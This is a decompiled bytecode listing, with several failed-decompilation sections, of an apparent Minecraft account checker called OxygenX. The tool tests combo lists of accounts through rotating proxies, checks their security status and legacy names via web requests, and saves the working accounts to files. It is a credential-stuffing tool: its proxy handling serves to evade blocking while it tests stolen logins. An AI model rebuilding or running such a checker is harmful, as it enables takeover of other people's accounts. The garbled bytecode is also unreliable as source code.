              624  JUMP_FORWARD        632  'to 632'
            626_0  COME_FROM           550  '550'

 L. 451       626  LOAD_FAST                'answer'
              628  POP_BLOCK        
              630  RETURN_VALUE     
            632_0  COME_FROM           624  '624'
            632_1  COME_FROM           532  '532'
              632  POP_BLOCK        
              634  JUMP_FORWARD        808  'to 808'
            636_0  COME_FROM_FINALLY   466  '466'

 L. 452       636  DUP_TOP          
              638  LOAD_GLOBAL              exceptions
              640  LOAD_ATTR                RequestException
              642  COMPARE_OP               exception-match
          644_646  POP_JUMP_IF_FALSE   744  'to 744'
              648  POP_TOP          
              650  POP_TOP          
              652  POP_TOP          

 L. 453       654  LOAD_GLOBAL              OxygenX
              656  LOAD_ATTR                Proxy
              658  LOAD_ATTR                remove_bad_proxy
          660_662  POP_JUMP_IF_FALSE   722  'to 722'
              664  LOAD_GLOBAL              len
              666  LOAD_FAST                'self'
              668  LOAD_ATTR                proxylist
              670  CALL_FUNCTION_1       1  ''
              672  LOAD_GLOBAL              OxygenX
              674  LOAD_ATTR                Proxy
              676  LOAD_ATTR                proxy_remove_limit
              678  COMPARE_OP               >=
          680_682  POP_JUMP_IF_FALSE   722  'to 722'

 L. 454       684  LOAD_FAST                'locked'
          686_688  POP_JUMP_IF_TRUE    740  'to 740'

 L. 455       690  SETUP_FINALLY       708  'to 708'

 L. 456       692  LOAD_FAST                'self'
              694  LOAD_ATTR                proxylist
              696  LOAD_METHOD              remove
              698  LOAD_FAST                'proxy'
              700  CALL_METHOD_1         1  ''
              702  POP_TOP          
              704  POP_BLOCK        
              706  JUMP_FORWARD        720  'to 720'
            708_0  COME_FROM_FINALLY   690  '690'

 L. 457       708  POP_TOP          
              710  POP_TOP          
              712  POP_TOP          

 L. 458       714  POP_EXCEPT       
              716  JUMP_FORWARD        720  'to 720'
              718  END_FINALLY      
            720_0  COME_FROM           716  '716'
            720_1  COME_FROM           706  '706'
              720  JUMP_FORWARD        740  'to 740'
            722_0  COME_FROM           680  '680'
            722_1  COME_FROM           660  '660'

 L. 459       722  LOAD_FAST                'locked'
          724_726  POP_JUMP_IF_FALSE   740  'to 740'

 L. 460       728  LOAD_FAST                'self'
              730  LOAD_ATTR                proxylist
              732  LOAD_METHOD              append
              734  LOAD_FAST                'proxy'
              736  CALL_METHOD_1         1  ''
              738  POP_TOP          
            740_0  COME_FROM           724  '724'
            740_1  COME_FROM           720  '720'
            740_2  COME_FROM           686  '686'
              740  POP_EXCEPT       
              742  JUMP_FORWARD        808  'to 808'
            744_0  COME_FROM           644  '644'

 L. 461       744  POP_TOP          
              746  POP_TOP          
              748  POP_TOP          

 L. 462       750  LOAD_FAST                'locked'
          752_754  POP_JUMP_IF_FALSE   768  'to 768'

 L. 463       756  LOAD_FAST                'self'
              758  LOAD_ATTR                proxylist
              760  LOAD_METHOD              append
              762  LOAD_FAST                'proxy'
              764  CALL_METHOD_1         1  ''
              766  POP_TOP          
            768_0  COME_FROM           752  '752'

 L. 464       768  LOAD_GLOBAL              OxygenX
              770  LOAD_ATTR                debug
          772_774  POP_JUMP_IF_FALSE   798  'to 798'

 L. 465       776  LOAD_FAST                'self'
              778  LOAD_METHOD              prints
              780  LOAD_STR                 'CheckMC: \n'
              782  LOAD_GLOBAL              format_exc
              784  LOAD_CONST               1
              786  LOAD_CONST               ('limit',)
              788  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              790  FORMAT_VALUE          0  ''
              792  BUILD_STRING_2        2 
              794  CALL_METHOD_1         1  ''
              796  POP_TOP          
            798_0  COME_FROM           772  '772'

 L. 466       798  POP_EXCEPT       
              800  JUMP_BACK           194  'to 194'
              802  POP_EXCEPT       
              804  JUMP_FORWARD        808  'to 808'
              806  END_FINALLY      
            808_0  COME_FROM           804  '804'
            808_1  COME_FROM           742  '742'
            808_2  COME_FROM           634  '634'
              808  JUMP_BACK           194  'to 194'
            810_0  COME_FROM           202  '202'

 L. 468       810  LOAD_FAST                'bad'
              812  RETURN_VALUE     
              814  JUMP_BACK           194  'to 194'
            816_0  COME_FROM           190  '190'

Parse error at or near `JUMP_BACK' instruction at offset 100

    def secure_check--- This code section failed: ---

 L. 471         0  LOAD_STR                 'no-cache'
                2  LOAD_STR                 'Bearer '
                4  LOAD_FAST                'token'
                6  FORMAT_VALUE          0  ''
                8  BUILD_STRING_2        2 
               10  LOAD_CONST               ('Pragma', 'Authorization')
               12  BUILD_CONST_KEY_MAP_2     2 
               14  STORE_FAST               'headers'

 L. 472     16_18  SETUP_FINALLY       532  'to 532'

 L. 473        20  LOAD_GLOBAL              OxygenX
               22  LOAD_ATTR                Proxy
               24  LOAD_ATTR                proxy
               26  POP_JUMP_IF_FALSE    36  'to 36'
               28  LOAD_GLOBAL              OxygenX
               30  LOAD_ATTR                Proxy
               32  LOAD_ATTR                sfa_proxy
               34  POP_JUMP_IF_TRUE    130  'to 130'
             36_0  COME_FROM            26  '26'

 L. 474        36  SETUP_FINALLY        82  'to 82'

 L. 475        38  LOAD_GLOBAL              session
               40  LOAD_ATTR                get
               42  LOAD_GLOBAL              sfa_url
               44  LOAD_FAST                'headers'
               46  LOAD_CONST               ('url', 'headers')
               48  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               50  LOAD_ATTR                text
               52  STORE_FAST               'z'

 L. 476        54  LOAD_FAST                'z'
               56  LOAD_STR                 '[]'
               58  COMPARE_OP               ==
               60  POP_JUMP_IF_FALSE    70  'to 70'

 L. 477        62  POP_BLOCK        
               64  POP_BLOCK        
               66  LOAD_CONST               True
               68  RETURN_VALUE     
             70_0  COME_FROM            60  '60'

 L. 479        70  POP_BLOCK        
               72  POP_BLOCK        
               74  LOAD_CONST               False
               76  RETURN_VALUE     
               78  POP_BLOCK        
               80  JUMP_FORWARD        528  'to 528'
             82_0  COME_FROM_FINALLY    36  '36'

 L. 480        82  POP_TOP          
               84  POP_TOP          
               86  POP_TOP          

 L. 481        88  LOAD_GLOBAL              OxygenX
               90  LOAD_ATTR                debug
               92  POP_JUMP_IF_FALSE   116  'to 116'

 L. 482        94  LOAD_FAST                'self'
               96  LOAD_METHOD              prints
               98  LOAD_STR                 'ErrorSFA ProxyLess: \n'
              100  LOAD_GLOBAL              format_exc
              102  LOAD_CONST               1
              104  LOAD_CONST               ('limit',)
              106  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              108  FORMAT_VALUE          0  ''
              110  BUILD_STRING_2        2 
              112  CALL_METHOD_1         1  ''
              114  POP_TOP          
            116_0  COME_FROM            92  '92'

 L. 483       116  POP_EXCEPT       
              118  POP_BLOCK        
              120  LOAD_CONST               False
              122  RETURN_VALUE     
              124  END_FINALLY      
          126_128  JUMP_FORWARD        528  'to 528'
            130_0  COME_FROM            34  '34'

 L. 486       130  BUILD_MAP_0           0 
              132  STORE_FAST               'proxy_form'

 L. 487       134  LOAD_GLOBAL              choice
              136  LOAD_FAST                'self'
              138  LOAD_ATTR                proxylist
              140  CALL_FUNCTION_1       1  ''
              142  STORE_FAST               'proxy'

 L. 488       144  LOAD_FAST                'proxy'
              146  LOAD_METHOD              count
              148  LOAD_STR                 ':'
              150  CALL_METHOD_1         1  ''
              152  LOAD_CONST               3
              154  COMPARE_OP               ==
              156  POP_JUMP_IF_FALSE   212  'to 212'

 L. 489       158  LOAD_FAST                'proxy'
              160  LOAD_METHOD              split
              162  LOAD_STR                 ':'
              164  CALL_METHOD_1         1  ''
              166  STORE_FAST               'spl'

 L. 490       168  LOAD_FAST                'spl'
              170  LOAD_CONST               2
              172  BINARY_SUBSCR    
              174  FORMAT_VALUE          0  ''
              176  LOAD_STR                 ':'
              178  LOAD_FAST                'spl'
              180  LOAD_CONST               3
              182  BINARY_SUBSCR    
              184  FORMAT_VALUE          0  ''
              186  LOAD_STR                 '@'
              188  LOAD_FAST                'spl'
              190  LOAD_CONST               0
              192  BINARY_SUBSCR    
              194  FORMAT_VALUE          0  ''
              196  LOAD_STR                 ':'
              198  LOAD_FAST                'spl'
              200  LOAD_CONST               1
              202  BINARY_SUBSCR    
              204  FORMAT_VALUE          0  ''
              206  BUILD_STRING_7        7 
              208  STORE_FAST               'proxy'
              210  JUMP_FORWARD        216  'to 216'
            212_0  COME_FROM           156  '156'

 L. 492       212  LOAD_FAST                'proxy'
              214  STORE_FAST               'proxy'
            216_0  COME_FROM           210  '210'

 L. 493       216  LOAD_FAST                'proxy'
              218  LOAD_CONST               ('', '\n')
              220  COMPARE_OP               in
          222_224  POP_JUMP_IF_FALSE   260  'to 260'

 L. 494       226  SETUP_FINALLY       248  'to 248'

 L. 495       228  LOAD_FAST                'self'
              230  LOAD_ATTR                proxylist
              232  LOAD_METHOD              remove
              234  LOAD_FAST                'proxy'
              236  CALL_METHOD_1         1  ''
              238  POP_TOP          

 L. 496       240  POP_BLOCK        
              242  JUMP_BACK           130  'to 130'
              244  POP_BLOCK        
              246  JUMP_FORWARD        260  'to 260'
            248_0  COME_FROM_FINALLY   226  '226'

 L. 497       248  POP_TOP          
              250  POP_TOP          
              252  POP_TOP          

 L. 498       254  POP_EXCEPT       
              256  JUMP_FORWARD        260  'to 260'
              258  END_FINALLY      
            260_0  COME_FROM           256  '256'
            260_1  COME_FROM           246  '246'
            260_2  COME_FROM           222  '222'

 L. 499       260  LOAD_GLOBAL              OxygenX
              262  LOAD_ATTR                Proxy
              264  LOAD_ATTR                type
              266  LOAD_STR                 'http'
              268  COMPARE_OP               ==
          270_272  POP_JUMP_IF_TRUE    288  'to 288'
              274  LOAD_GLOBAL              OxygenX
              276  LOAD_ATTR                Proxy
              278  LOAD_ATTR                type
              280  LOAD_STR                 'https'
              282  COMPARE_OP               ==
          284_286  POP_JUMP_IF_FALSE   312  'to 312'
            288_0  COME_FROM           270  '270'

 L. 500       288  LOAD_STR                 'http://'
              290  LOAD_FAST                'proxy'
              292  FORMAT_VALUE          0  ''
              294  BUILD_STRING_2        2 
              296  LOAD_STR                 'https://'
              298  LOAD_FAST                'proxy'
              300  FORMAT_VALUE          0  ''
              302  BUILD_STRING_2        2 
              304  LOAD_CONST               ('http', 'https')
              306  BUILD_CONST_KEY_MAP_2     2 
              308  STORE_FAST               'proxy_form'
              310  JUMP_FORWARD        368  'to 368'
            312_0  COME_FROM           284  '284'

 L. 501       312  LOAD_GLOBAL              OxygenX
              314  LOAD_ATTR                Proxy
              316  LOAD_ATTR                type
              318  LOAD_STR                 'socks4'
              320  COMPARE_OP               ==
          322_324  POP_JUMP_IF_TRUE    340  'to 340'
              326  LOAD_GLOBAL              OxygenX
              328  LOAD_ATTR                Proxy
              330  LOAD_ATTR                type
              332  LOAD_STR                 'socks5'
              334  COMPARE_OP               ==
          336_338  POP_JUMP_IF_FALSE   368  'to 368'
            340_0  COME_FROM           322  '322'

 L. 502       340  LOAD_GLOBAL              OxygenX
              342  LOAD_ATTR                Proxy
              344  LOAD_ATTR                type
              346  FORMAT_VALUE          0  ''
              348  LOAD_STR                 '://'
              350  LOAD_FAST                'proxy'
              352  FORMAT_VALUE          0  ''
              354  BUILD_STRING_3        3 
              356  STORE_FAST               'line'

 L. 503       358  LOAD_FAST                'line'
              360  LOAD_FAST                'line'
              362  LOAD_CONST               ('http', 'https')
              364  BUILD_CONST_KEY_MAP_2     2 
              366  STORE_FAST               'proxy_form'
            368_0  COME_FROM           336  '336'
            368_1  COME_FROM           310  '310'

 L. 504       368  SETUP_FINALLY       438  'to 438'

 L. 505       370  LOAD_GLOBAL              session
              372  LOAD_ATTR                get
              374  LOAD_GLOBAL              sfa_url
              376  LOAD_FAST                'headers'
              378  LOAD_FAST                'proxy_form'
              380  LOAD_CONST               ('url', 'headers', 'proxies')
              382  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              384  LOAD_ATTR                text
              386  STORE_FAST               'resp'

 L. 506       388  LOAD_STR                 'request blocked'
              390  LOAD_FAST                'resp'
              392  LOAD_METHOD              lower
              394  CALL_METHOD_0         0  ''
              396  COMPARE_OP               in
          398_400  POP_JUMP_IF_FALSE   408  'to 408'

 L. 507       402  POP_BLOCK        
              404  JUMP_BACK           130  'to 130'
              406  JUMP_FORWARD        434  'to 434'
            408_0  COME_FROM           398  '398'

 L. 508       408  LOAD_FAST                'resp'
              410  LOAD_STR                 '[]'
              412  COMPARE_OP               ==
          414_416  POP_JUMP_IF_FALSE   426  'to 426'

 L. 509       418  POP_BLOCK        
              420  POP_BLOCK        
              422  LOAD_CONST               True
              424  RETURN_VALUE     
            426_0  COME_FROM           414  '414'

 L. 511       426  POP_BLOCK        
              428  POP_BLOCK        
              430  LOAD_CONST               False
              432  RETURN_VALUE     
            434_0  COME_FROM           406  '406'
              434  POP_BLOCK        
              436  JUMP_BACK           130  'to 130'
            438_0  COME_FROM_FINALLY   368  '368'

 L. 512       438  DUP_TOP          
              440  LOAD_GLOBAL              exceptions
              442  LOAD_ATTR                RequestException
              444  COMPARE_OP               exception-match
          446_448  POP_JUMP_IF_FALSE   524  'to 524'
              450  POP_TOP          
              452  POP_TOP          
              454  POP_TOP          

 L. 513       456  LOAD_GLOBAL              OxygenX
              458  LOAD_ATTR                Proxy
              460  LOAD_ATTR                remove_bad_proxy
          462_464  POP_JUMP_IF_FALSE   516  'to 516'
              466  LOAD_GLOBAL              len
              468  LOAD_FAST                'self'
              470  LOAD_ATTR                proxylist
              472  CALL_FUNCTION_1       1  ''
              474  LOAD_GLOBAL              OxygenX
              476  LOAD_ATTR                Proxy
              478  LOAD_ATTR                proxy_remove_limit
            480_0  COME_FROM            80  '80'
              480  COMPARE_OP               >=
          482_484  POP_JUMP_IF_FALSE   516  'to 516'

 L. 514       486  SETUP_FINALLY       504  'to 504'

 L. 515       488  LOAD_FAST                'self'
              490  LOAD_ATTR                proxylist
              492  LOAD_METHOD              remove
              494  LOAD_FAST                'proxy'
              496  CALL_METHOD_1         1  ''
              498  POP_TOP          
              500  POP_BLOCK        
              502  JUMP_FORWARD        516  'to 516'
            504_0  COME_FROM_FINALLY   486  '486'

 L. 516       504  POP_TOP          
              506  POP_TOP          
              508  POP_TOP          

 L. 517       510  POP_EXCEPT       
              512  JUMP_FORWARD        516  'to 516'
              514  END_FINALLY      
            516_0  COME_FROM           512  '512'
            516_1  COME_FROM           502  '502'
            516_2  COME_FROM           482  '482'
            516_3  COME_FROM           462  '462'

 L. 518       516  POP_EXCEPT       
              518  JUMP_BACK           130  'to 130'
              520  POP_EXCEPT       
              522  JUMP_BACK           130  'to 130'
            524_0  COME_FROM           446  '446'
              524  END_FINALLY      
              526  JUMP_BACK           130  'to 130'
            528_0  COME_FROM           126  '126'
              528  POP_BLOCK        
              530  JUMP_FORWARD        576  'to 576'
            532_0  COME_FROM_FINALLY    16  '16'

 L. 519       532  POP_TOP          
              534  POP_TOP          
              536  POP_TOP          

 L. 520       538  LOAD_GLOBAL              OxygenX
              540  LOAD_ATTR                debug
          542_544  POP_JUMP_IF_FALSE   568  'to 568'

 L. 521       546  LOAD_FAST                'self'
              548  LOAD_METHOD              prints
              550  LOAD_STR                 'Error SFA: \n'
              552  LOAD_GLOBAL              format_exc
              554  LOAD_CONST               1
              556  LOAD_CONST               ('limit',)
              558  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              560  FORMAT_VALUE          0  ''
              562  BUILD_STRING_2        2 
              564  CALL_METHOD_1         1  ''
              566  POP_TOP          
            568_0  COME_FROM           542  '542'

 L. 522       568  POP_EXCEPT       
              570  LOAD_CONST               False
              572  RETURN_VALUE     
              574  END_FINALLY      
            576_0  COME_FROM           530  '530'

Parse error at or near `POP_BLOCK' instruction at offset 64

    def checkname--- This code section failed: ---

 L. 525       0_2  SETUP_FINALLY       486  'to 486'

 L. 526         4  LOAD_GLOBAL              OxygenX
                6  LOAD_ATTR                Proxy
                8  LOAD_ATTR                proxy
            10_12  POP_JUMP_IF_FALSE   364  'to 364'

 L. 528        14  BUILD_MAP_0           0 
               16  STORE_FAST               'proxy_form'

 L. 529        18  LOAD_GLOBAL              choice
               20  LOAD_FAST                'self'
               22  LOAD_ATTR                proxylist
               24  CALL_FUNCTION_1       1  ''
               26  STORE_FAST               'proxy'

 L. 530        28  LOAD_FAST                'proxy'
               30  LOAD_METHOD              count
               32  LOAD_STR                 ':'
               34  CALL_METHOD_1         1  ''
               36  LOAD_CONST               3
               38  COMPARE_OP               ==
               40  POP_JUMP_IF_FALSE    96  'to 96'

 L. 531        42  LOAD_FAST                'proxy'
               44  LOAD_METHOD              split
               46  LOAD_STR                 ':'
               48  CALL_METHOD_1         1  ''
               50  STORE_FAST               'spl'

 L. 532        52  LOAD_FAST                'spl'
               54  LOAD_CONST               2
               56  BINARY_SUBSCR    
               58  FORMAT_VALUE          0  ''
               60  LOAD_STR                 ':'
               62  LOAD_FAST                'spl'
               64  LOAD_CONST               3
               66  BINARY_SUBSCR    
               68  FORMAT_VALUE          0  ''
               70  LOAD_STR                 '@'
               72  LOAD_FAST                'spl'
               74  LOAD_CONST               0
               76  BINARY_SUBSCR    
               78  FORMAT_VALUE          0  ''
               80  LOAD_STR                 ':'
               82  LOAD_FAST                'spl'
               84  LOAD_CONST               1
               86  BINARY_SUBSCR    
               88  FORMAT_VALUE          0  ''
               90  BUILD_STRING_7        7 
               92  STORE_FAST               'proxy'
               94  JUMP_FORWARD        100  'to 100'
             96_0  COME_FROM            40  '40'

 L. 534        96  LOAD_FAST                'proxy'
               98  STORE_FAST               'proxy'
            100_0  COME_FROM            94  '94'

 L. 535       100  LOAD_GLOBAL              OxygenX
              102  LOAD_ATTR                Proxy
              104  LOAD_ATTR                type
              106  LOAD_STR                 'http'
              108  COMPARE_OP               ==
              110  POP_JUMP_IF_TRUE    124  'to 124'
              112  LOAD_GLOBAL              OxygenX
              114  LOAD_ATTR                Proxy
              116  LOAD_ATTR                type
              118  LOAD_STR                 'https'
              120  COMPARE_OP               ==
              122  POP_JUMP_IF_FALSE   148  'to 148'
            124_0  COME_FROM           110  '110'

 L. 536       124  LOAD_STR                 'http://'
              126  LOAD_FAST                'proxy'
              128  FORMAT_VALUE          0  ''
              130  BUILD_STRING_2        2 
              132  LOAD_STR                 'https://'
              134  LOAD_FAST                'proxy'
              136  FORMAT_VALUE          0  ''
              138  BUILD_STRING_2        2 
              140  LOAD_CONST               ('http', 'https')
              142  BUILD_CONST_KEY_MAP_2     2 
              144  STORE_FAST               'proxy_form'
              146  JUMP_FORWARD        200  'to 200'
            148_0  COME_FROM           122  '122'

 L. 537       148  LOAD_GLOBAL              OxygenX
              150  LOAD_ATTR                Proxy
              152  LOAD_ATTR                type
              154  LOAD_STR                 'socks4'
              156  COMPARE_OP               ==
              158  POP_JUMP_IF_TRUE    172  'to 172'
              160  LOAD_GLOBAL              OxygenX
              162  LOAD_ATTR                Proxy
              164  LOAD_ATTR                type
              166  LOAD_STR                 'socks5'
              168  COMPARE_OP               ==
              170  POP_JUMP_IF_FALSE   200  'to 200'
            172_0  COME_FROM           158  '158'

 L. 538       172  LOAD_GLOBAL              OxygenX
              174  LOAD_ATTR                Proxy
              176  LOAD_ATTR                type
              178  FORMAT_VALUE          0  ''
              180  LOAD_STR                 '://'
              182  LOAD_FAST                'proxy'
              184  FORMAT_VALUE          0  ''
              186  BUILD_STRING_3        3 
              188  STORE_FAST               'line'

 L. 539       190  LOAD_FAST                'line'
              192  LOAD_FAST                'line'
              194  LOAD_CONST               ('http', 'https')
              196  BUILD_CONST_KEY_MAP_2     2 
              198  STORE_FAST               'proxy_form'
            200_0  COME_FROM           170  '170'
            200_1  COME_FROM           146  '146'

 L. 540       200  SETUP_FINALLY       272  'to 272'

 L. 541       202  LOAD_GLOBAL              scraper
              204  LOAD_ATTR                post
              206  LOAD_GLOBAL              user_url
              208  LOAD_FAST                'username'
              210  BUILD_LIST_1          1 
              212  LOAD_FAST                'proxy_form'
              214  LOAD_GLOBAL              mailheaders

 L. 542       216  LOAD_GLOBAL              OxygenX
              218  LOAD_ATTR                timeout

 L. 541       220  LOAD_CONST               ('url', 'json', 'proxies', 'headers', 'timeout')
              222  CALL_FUNCTION_KW_5     5  '5 total positional and keyword args'
              224  LOAD_ATTR                text
              226  STORE_FAST               'answer'

 L. 543       228  LOAD_STR                 'The request could not be satisfied'
              230  LOAD_FAST                'answer'
              232  COMPARE_OP               in
              234  POP_JUMP_IF_FALSE   242  'to 242'

 L. 544       236  POP_BLOCK        
              238  JUMP_BACK            14  'to 14'
              240  JUMP_FORWARD        268  'to 268'
            242_0  COME_FROM           234  '234'

 L. 545       242  LOAD_STR                 'legacy":true'
              244  LOAD_FAST                'answer'
              246  COMPARE_OP               in
          248_250  POP_JUMP_IF_FALSE   260  'to 260'

 L. 546       252  POP_BLOCK        
              254  POP_BLOCK        
              256  LOAD_CONST               True
              258  RETURN_VALUE     
            260_0  COME_FROM           248  '248'

 L. 548       260  POP_BLOCK        
              262  POP_BLOCK        
              264  LOAD_CONST               False
              266  RETURN_VALUE     
            268_0  COME_FROM           240  '240'
              268  POP_BLOCK        
              270  JUMP_BACK            14  'to 14'
            272_0  COME_FROM_FINALLY   200  '200'

 L. 549       272  DUP_TOP          
              274  LOAD_GLOBAL              exceptions
              276  LOAD_ATTR                RequestException
              278  COMPARE_OP               exception-match
          280_282  POP_JUMP_IF_FALSE   358  'to 358'
              284  POP_TOP          
              286  POP_TOP          
              288  POP_TOP          

 L. 550       290  LOAD_GLOBAL              OxygenX
              292  LOAD_ATTR                Proxy
              294  LOAD_ATTR                remove_bad_proxy
          296_298  POP_JUMP_IF_FALSE   350  'to 350'
              300  LOAD_GLOBAL              len
              302  LOAD_FAST                'self'
              304  LOAD_ATTR                proxylist
              306  CALL_FUNCTION_1       1  ''
              308  LOAD_GLOBAL              OxygenX
              310  LOAD_ATTR                Proxy
              312  LOAD_ATTR                proxy_remove_limit
              314  COMPARE_OP               >=
          316_318  POP_JUMP_IF_FALSE   350  'to 350'

 L. 551       320  SETUP_FINALLY       338  'to 338'

 L. 552       322  LOAD_FAST                'self'
              324  LOAD_ATTR                proxylist
              326  LOAD_METHOD              remove
              328  LOAD_FAST                'proxy'
              330  CALL_METHOD_1         1  ''
              332  POP_TOP          
              334  POP_BLOCK        
              336  JUMP_FORWARD        350  'to 350'
            338_0  COME_FROM_FINALLY   320  '320'

 L. 553       338  POP_TOP          
              340  POP_TOP          
              342  POP_TOP          

 L. 554       344  POP_EXCEPT       
              346  JUMP_FORWARD        350  'to 350'
              348  END_FINALLY      
            350_0  COME_FROM           346  '346'
            350_1  COME_FROM           336  '336'
            350_2  COME_FROM           316  '316'
            350_3  COME_FROM           296  '296'

 L. 555       350  POP_EXCEPT       
              352  JUMP_BACK            14  'to 14'
              354  POP_EXCEPT       
              356  JUMP_BACK            14  'to 14'
            358_0  COME_FROM           280  '280'
              358  END_FINALLY      
              360  JUMP_BACK            14  'to 14'
              362  JUMP_FORWARD        482  'to 482'
            364_0  COME_FROM            10  '10'

 L. 557       364  SETUP_FINALLY       432  'to 432'

 L. 558       366  LOAD_GLOBAL              sleep
              368  LOAD_GLOBAL              OxygenX
              370  LOAD_ATTR                Proxy
              372  LOAD_ATTR                sleep
              374  CALL_FUNCTION_1       1  ''
              376  POP_TOP          

 L. 559       378  LOAD_GLOBAL              scraper
              380  LOAD_ATTR                post
              382  LOAD_GLOBAL              user_url
              384  LOAD_FAST                'username'
              386  BUILD_LIST_1          1 
              388  LOAD_GLOBAL              mailheaders

 L. 560       390  LOAD_GLOBAL              OxygenX
              392  LOAD_ATTR                timeout

 L. 559       394  LOAD_CONST               ('url', 'json', 'headers', 'timeout')
              396  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
              398  LOAD_ATTR                text
              400  STORE_FAST               'answer'

 L. 561       402  LOAD_STR                 'legacy":true'
              404  LOAD_FAST                'answer'
              406  COMPARE_OP               in
          408_410  POP_JUMP_IF_FALSE   420  'to 420'

 L. 562       412  POP_BLOCK        
              414  POP_BLOCK        
              416  LOAD_CONST               True
              418  RETURN_VALUE     
            420_0  COME_FROM           408  '408'

 L. 564       420  POP_BLOCK        
              422  POP_BLOCK        
              424  LOAD_CONST               False
              426  RETURN_VALUE     
              428  POP_BLOCK        
              430  JUMP_FORWARD        482  'to 482'
            432_0  COME_FROM_FINALLY   364  '364'

 L. 565       432  POP_TOP          
              434  POP_TOP          
              436  POP_TOP          

 L. 566       438  LOAD_GLOBAL              OxygenX
              440  LOAD_ATTR                debug
          442_444  POP_JUMP_IF_FALSE   472  'to 472'

 L. 567       446  LOAD_FAST                'self'
              448  LOAD_METHOD              prints
              450  LOAD_GLOBAL              red
              452  FORMAT_VALUE          0  ''
              454  LOAD_STR                 '[Error Check] '
              456  LOAD_GLOBAL              format_exc
              458  LOAD_CONST               1
              460  LOAD_CONST               ('limit',)
              462  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              464  FORMAT_VALUE          0  ''
              466  BUILD_STRING_3        3 
              468  CALL_METHOD_1         1  ''
              470  POP_TOP          
            472_0  COME_FROM           442  '442'

 L. 568       472  POP_EXCEPT       
              474  POP_BLOCK        
              476  LOAD_CONST               False
              478  RETURN_VALUE     
              480  END_FINALLY      
            482_0  COME_FROM           430  '430'
            482_1  COME_FROM           362  '362'
              482  POP_BLOCK        
              484  JUMP_FORWARD        534  'to 534'
            486_0  COME_FROM_FINALLY     0  '0'

 L. 569       486  POP_TOP          
              488  POP_TOP          
              490  POP_TOP          

 L. 570       492  LOAD_GLOBAL              OxygenX
              494  LOAD_ATTR                debug
          496_498  POP_JUMP_IF_FALSE   526  'to 526'

 L. 571       500  LOAD_FAST                'self'
              502  LOAD_METHOD              prints
              504  LOAD_GLOBAL              red
              506  FORMAT_VALUE          0  ''
              508  LOAD_STR                 '[Error Check] '
              510  LOAD_GLOBAL              format_exc
              512  LOAD_CONST               1
              514  LOAD_CONST               ('limit',)
              516  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              518  FORMAT_VALUE          0  ''
              520  BUILD_STRING_3        3 
              522  CALL_METHOD_1         1  ''
              524  POP_TOP          
            526_0  COME_FROM           496  '496'

 L. 572       526  POP_EXCEPT       
              528  LOAD_CONST               False
              530  RETURN_VALUE     
              532  END_FINALLY      
            534_0  COME_FROM           484  '484'

Parse error at or near `JUMP_BACK' instruction at offset 238

    def title(self):
        while self.stop_time:
            if not self.unmigrated:
                set_title(f"OxygenX-{version} | Hits: {Counter.hits} - Bad: {Counter.bad}{'' if Counter.nfa == 0 else  - NFA: {Counter.nfa}}{'' if Counter.sfa == 0 else  - SFA: {Counter.sfa}}{'' if Counter.unfa == 0 else  - Unmigrated: {Counter.unfa}}{'' if Counter.demo == 0 else  - Demo: {Counter.demo}}{'' if Counter.mfa == 0 else  - MFA: {Counter.mfa}}{'' if Counter.error == 0 else  | Errors: {Counter.error}} | Left: {len(self.accounts) - Counter.checked}/{len(self.accounts)}{'' if not OxygenX.Proxy.proxy else  - Proxies: {len(self.proxylist)}} | CPM: {Counter.cpm} | {self.now_time()} Elapsed")
            else:
                set_title(f"OxygenX-{version} | Hits: {Counter.hits} - Bad: {Counter.bad}{'' if Counter.legacy_name == 0 else  - Legacy Lines: {Counter.legacy_name}}{'' if Counter.unfa == 0 else  - Unmigrated: {Counter.unfa}}{'' if Counter.error == 0 else  | Errors: {Counter.error}} | Left: {len(self.accounts) - Counter.checked}/{len(self.accounts)}{'' if not OxygenX.Proxy.proxy else  - Proxies: {len(self.proxylist)}} | CPM: {Counter.cpm} | {self.now_time()} Elapsed | Unmigrated Checker")

    def prints(self, line):
        lock.acquire()
        print(f"{blue}{self.now_time()} {line}")
        lock.release()

    def writing(self, line):
        lock.acquire()
        open(f"{self.folder}/{line[1]}.txt", 'a', encoding='u8').write(f"{line[0]}\n")
        lock.release()

    def optifine--- This code section failed: ---

 L. 615         0  LOAD_CONST               False
                2  STORE_FAST               'cape'

 L. 616         4  LOAD_GLOBAL              OxygenX
                6  LOAD_ATTR                Cape
                8  LOAD_ATTR                optifine
               10  POP_JUMP_IF_FALSE   136  'to 136'

 L. 617        12  SETUP_FINALLY        92  'to 92'

 L. 618        14  LOAD_GLOBAL              session
               16  LOAD_ATTR                get
               18  LOAD_STR                 'http://s.optifine.net/capes/'
               20  LOAD_FAST                'user'
               22  FORMAT_VALUE          0  ''
               24  LOAD_STR                 '.png'
               26  BUILD_STRING_3        3 
               28  LOAD_CONST               ('url',)
               30  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               32  LOAD_ATTR                text
               34  STORE_FAST               'optifine'

 L. 619        36  LOAD_STR                 'Not found'
               38  LOAD_FAST                'optifine'
               40  COMPARE_OP               not-in
               42  POP_JUMP_IF_FALSE    86  'to 86'

 L. 620        44  LOAD_CONST               True
               46  STORE_FAST               'cape'

 L. 621        48  LOAD_GLOBAL              Counter
               50  DUP_TOP          
               52  LOAD_ATTR                optifine
               54  LOAD_CONST               1
               56  INPLACE_ADD      
               58  ROT_TWO          
               60  STORE_ATTR               optifine

 L. 622        62  LOAD_FAST                'self'
               64  LOAD_METHOD              writing
               66  LOAD_FAST                'combo'
               68  FORMAT_VALUE          0  ''
               70  LOAD_STR                 ' | Username: '
               72  LOAD_FAST                'user'
               74  FORMAT_VALUE          0  ''
               76  BUILD_STRING_3        3 
               78  LOAD_STR                 'OptifineCape'
               80  BUILD_LIST_2          2 
               82  CALL_METHOD_1         1  ''
               84  POP_TOP          
             86_0  COME_FROM            42  '42'

 L. 623        86  LOAD_FAST                'cape'
               88  POP_BLOCK        
               90  RETURN_VALUE     
             92_0  COME_FROM_FINALLY    12  '12'

 L. 624        92  POP_TOP          
               94  POP_TOP          
               96  POP_TOP          

 L. 625        98  LOAD_GLOBAL              OxygenX
              100  LOAD_ATTR                debug
              102  POP_JUMP_IF_FALSE   130  'to 130'

